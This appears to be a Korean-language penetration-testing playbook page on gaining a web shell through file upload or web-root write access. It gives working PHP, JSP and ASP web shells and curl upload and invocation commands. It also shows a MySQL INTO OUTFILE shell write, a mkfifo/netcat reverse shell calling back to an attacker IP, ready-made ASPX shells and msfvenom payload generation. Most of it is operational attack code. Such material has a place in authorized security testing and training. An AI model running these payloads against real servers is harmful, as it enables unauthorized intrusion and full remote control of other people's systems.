---
tags:
  - 서비스/http
시작조건: ["업로드 기능 또는 웹 루트 쓰기 권한 확보", "업로드 파일 접근 경로 확인"]
필요권한: ["업로드 기능 사용 권한 또는 웹 루트 쓰기 권한"]
필요조건: ["업로드 파일 접근 경로"]
결과: ["파일 쓰기", "명령 실행", "세션"]
---

# 웹 파일 업로드와 Web Shell

## 한 줄 판단

대상 웹 애플리케이션의 업로드 기능 또는 웹 루트 파일 쓰기 권한이 있고 업로드된 URL을 확인할 수 있다면, 허용 확장자·저장 경로·서버 측 실행 여부를 분리해 검증한 뒤 웹 서비스 계정의 Web Shell 또는 Reverse Shell을 얻는다.

## 사용할 때

- 웹에서 파일 업로드 기능이 있고 확장자/Content-Type/저장 경로를 통제할 수 있을 때.
- FTP/SMB/NFS/Rsync/DB 파일 쓰기가 웹 루트와 연결될 때.
- PHP/JSP/ASPX 같은 서버 측 실행 환경이 확인될 때.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 업로드 가능 | 브라우저/프록시/curl | 파일 저장 성공 |
| 접근 가능 경로 | 응답/다운로드 URL/디렉터리 | 업로드 파일 HTTP 접근 |
| 실행 언어 | PHP/JSP/ASP/ASPX 등 서버 스택 | 업로드한 확장자를 서버가 실행 |
| 명령 전달 | GET/POST 파라미터, URL 인코딩 | 특수문자를 포함한 명령이 손상되지 않음 |
| 출력 처리 | HTTP 응답, stdout/stderr | 명령 출력 또는 blind 실행 단서 확인 |
| 네트워크 egress | 공격자 listener 접근 | reverse shell이 필요할 때만 확인 |

## 실행

1. 식별 가능한 텍스트 파일로 업로드와 접근 경로를 확인한다.
2. 서버 스택에 맞는 최소 Web Shell을 준비한다.
3. 확장자, MIME, magic bytes, 경로 제약을 확인한다.
4. `id`/`whoami` 같은 저위험 명령으로 실행 여부를 검증한다.
5. 필요하면 [[Reverse Shell 획득]]으로 전환한다.

### 파일 쓰기 출처별 시작점

| 현재 확인한 파일 쓰기 경로 | 이 문서에서 먼저 확인할 조건 | 다음 실행 |
|---|---|---|
| 웹 업로드 기능 | 업로드된 URL, 저장 이름, 서버 측 handler | 최소 Web Shell 업로드와 호출 |
| WebDAV `PUT`·`MOVE` | 최종 URL과 확장자 handler | [[WebDAV PUT 업로드와 실행]]에서 파일 쓰기 확인 후 최소 Web Shell 호출 |
| CoreFTP HTTP `PUT` path traversal | 확인된 웹 루트와 스크립트 handler | [[CoreFTP HTTP PUT Path Traversal]]에서 경로 이탈 쓰기 확인 후 최소 Web Shell 호출 |
| MySQL `FILE` 권한과 웹 루트 쓰기 | `secure_file_priv`, DB 서비스 계정의 OS 쓰기 권한, HTTP로 제공되는 실제 경로 | 고유 Web Shell 파일을 기록한 뒤 HTTP 명령 출력 확인 |
| Oracle `UTL_FILE`과 웹 노출 directory | Oracle directory 쓰기, HTTP로 제공되는 실제 경로, 서버 스크립트 handler | [[1521_Oracle_TNS#선택적 UTL_FILE 텍스트 쓰기 proof|Oracle UTL_FILE 텍스트 쓰기 검증]]에서 텍스트 파일 쓰기와 조회를 확인한 뒤 Web Shell 파일로 전환 |

파일 쓰기 성공은 Web Shell 실행 성공이 아니다. 각 선행 문서에서 고유 텍스트 파일의 생성과 HTTP 조회를 먼저 확인한 뒤, 이 문서에서 서버 측 handler와 명령 출력을 검증한다.

### 명령과 확인할 출력

#### 언어별 최소 Web Shell

PHP:

```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP:

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP:

```asp
<% eval request("cmd") %>
```

확인할 출력:

- 서버가 실제로 처리하는 언어와 업로드 확장자가 일치해야 한다.
- PHP 예시는 `cmd` 파라미터의 OS 명령 출력을 HTTP 응답으로 반환한다.
- JSP 예시는 프로세스를 실행하지만 stdout/stderr를 응답에 쓰는 코드가 없어 출력이 보이지 않을 수 있다.
- ASP 예시는 Classic ASP 실행 여부를 확인하는 최소 형태이며, 대상의 스크립트 엔진과 명령 처리 방식에 맞는지 별도로 확인한다.

#### 업로드 확인

```bash
curl -F "file=@proof.txt" http://<TARGET>/upload
curl http://<TARGET>/uploads/proof.txt
```

확인할 출력:

- 업로드 성공 응답과 파일 내용 조회.

#### Web Shell 호출

```bash
curl "http://<TARGET>/uploads/shell.php?cmd=id"
curl "http://<TARGET>/uploads/shell.aspx?cmd=whoami"
curl -G "http://<TARGET>/uploads/shell.php" --data-urlencode "cmd=whoami"
```

확인할 출력:

- 웹 서버 사용자 권한의 명령 출력.
- 공백, `&`, `|`, redirect가 포함된 명령은 `--data-urlencode`로 전달해 URL 해석 오류를 줄인다.

#### MySQL 파일 쓰기에서 Web Shell로 전환

MySQL의 `FILE` 권한, `secure_file_priv` 허용 경로, DB 서비스 계정의 웹 루트 쓰기 권한과 실제 HTTP 경로가 모두 확인된 경우에만 실행한다.

```sql
SELECT '<?php echo shell_exec($_GET["c"]);?>' INTO OUTFILE '/var/www/html/<UNIQUE_SHELL>.php';
```

```bash
curl -G "http://<TARGET>/<UNIQUE_SHELL>.php" --data-urlencode "c=id"
```

확인할 출력:

- SQL의 `Query OK`는 파일 쓰기만 의미한다. HTTP 응답에 `id` 결과가 반환되어야 PHP handler를 통한 명령 실행으로 판정한다.
- `File exists`이면 기존 파일을 덮어쓰지 말고 새 고유 파일명을 사용한다.

#### Web Shell에서 reverse shell 전환

공격자 호스트에서 listener를 먼저 연다.

```bash
nc -lvnp 9443
```

Web Shell을 호출해 연결 명령을 실행한다.

```bash
curl -G "http://<TARGET>/uploads/shell.php" --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 9443 >/tmp/f"
```

확인할 출력:

- HTTP 응답이 비어 있어도 listener에 대상 연결과 셸 출력이 들어오면 세션 전환 성공이다.
- 연결 후 `id`, `hostname`, `pwd`로 웹 요청을 처리한 호스트와 실행 계정을 다시 확인한다.

#### 준비된 ASPX Web Shell 사용

Laudanum:

```bash
cp /usr/share/laudanum/aspx/shell.aspx ~/webshells/demo.aspx
```

- 업로드 전에 파일 내부의 허용 IP, 콜백 IP·포트와 인증 관련 값을 현재 대상 경로에 맞게 수정한다.

Nishang Antak:

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/webshells/
```

- ASP.NET 환경에서 PowerShell 콘솔 형태가 필요할 때 사용한다.
- 업로드 전 파일 내부의 고정 자격 증명과 불필요한 주석·표시 문자열을 제거한다.

#### payload 생성 후보

```bash
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw -o shell.php
```

확인할 출력:

- 서버 스택에 맞는 payload 파일 생성.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 업로드 성공 응답은 있지만 파일 URL을 찾지 못함 | 저장 경로 또는 이름 미확정 | 파일 쓰기 미확정 | 응답의 저장 이름, 다운로드 기능, 디렉터리 구조 확인 |
| 업로드 파일을 HTTP로 조회하고 원문이 그대로 반환됨 | 웹 접근 가능한 파일 쓰기만 확인, 서버 측 실행은 안 됨 | 파일 쓰기 | 실행 언어, 확장자 handler, 업로드 디렉터리 실행 정책 확인 |
| `id`, `whoami`, `pwd`, `hostname` 출력이 HTTP 응답에 반환됨 | 서버 측 명령 실행 성공 | 명령 실행 | 실행 계정과 읽기·쓰기 가능한 경로 확인 |
| HTTP 응답은 비어 있지만 `sleep` 지연 또는 DNS/HTTP callback이 재현됨 | blind 명령 실행 가능성 | 명령 실행 단서 | stdout/stderr 처리와 직접 확인 가능한 callback으로 재검증 |
| reverse shell listener에 연결과 명령 출력이 들어옴 | 대화형 세션 전환 성공 | 세션 | [[Reverse Shell 획득]]에서 세션 안정성과 권한 확인 |
| `403`, `500` 또는 필터 메시지 | 확장자·MIME·내용 필터, WAF 또는 실행 정책 | 시작 상태 유지 | 허용 확장자, Content-Type, 파일 시그니처, 서버 오류 로그 확인 |
| 업로드 파일이 실행 직후 삭제되거나 세션이 즉시 종료됨 | 정리 작업, 프로세스 또는 네트워크 제한 | 불안정한 명령 실행 | 짧은 명령으로 재현하고 안정적인 인증 서비스 또는 셸로 전환 |

## 확인할 출력과 권한

- 판정 기준: 업로드, HTTP 접근, 서버 측 실행, reverse shell 수신을 단계별로 확인하고 `id`·`whoami`로 웹 서버 권한을 판정한다.

## 변경 영향과 복구

업로드한 proof, Web Shell과 생성한 FIFO를 정확한 경로로 제거한다. 애플리케이션 삭제 기능이 있으면 해당 기능을 우선하고, 확보한 셸을 사용한다면 Web Shell을 마지막에 제거한다.

```bash
rm -f -- /tmp/f
rm -f -- <WEB_ROOT>/<UNIQUE_PROOF> <WEB_ROOT>/<UNIQUE_SHELL>
```

Windows:

```cmd
del /f /q "<WEB_ROOT>\<UNIQUE_PROOF>"
del /f /q "<WEB_ROOT>\<UNIQUE_SHELL>"
```

삭제 후 업로드 URL이 더 이상 파일을 반환하지 않는지 확인한다. 서버 측 삭제 경로가 없다면 실행 파일 업로드 전에 고유 proof 삭제 가능 여부부터 확인한다.

## 후속 공격 연결

- [[Reverse Shell 획득]]
- [[TTY 업그레이드]]
- [[상황별 파일 전송]]
- [[Linux 권한 상승 열거]]
- [[Windows 권한 상승 열거]]

## 관련 서비스

- [[80_443_HTTP_HTTPS]]
- [[8080_8443_Web_Alt]]

## 관련 상태 라우터

- 실행 컨텍스트가 확인된 셸이면 대상 OS에 따라 [[Linux 셸 확보 후 초기 열거와 권한 상승]] 또는 [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]

## 관련 도구

- [[curl]]
- [[msfvenom]]
